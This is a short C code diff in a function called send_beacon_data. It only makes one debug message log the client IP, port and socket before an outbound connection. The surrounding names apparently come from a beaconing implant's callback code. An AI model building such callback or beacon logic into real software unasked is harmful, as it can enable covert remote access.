@@ -560,7 +560,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	encrypt_size = packetSize + (8 - (packetSize % 8));
 
 	//connect to the client
-	DLX(4, printf("Connecting to client...\n"));
+	DLX(4, printf("Connecting to client %s on port %d using socket: %d\n", beaconInfo->ip, beaconInfo->port, sock));
 	retval = net_connect(&sock,beaconInfo->ip, beaconInfo->port);
 
 	if ( retval != SUCCESS )
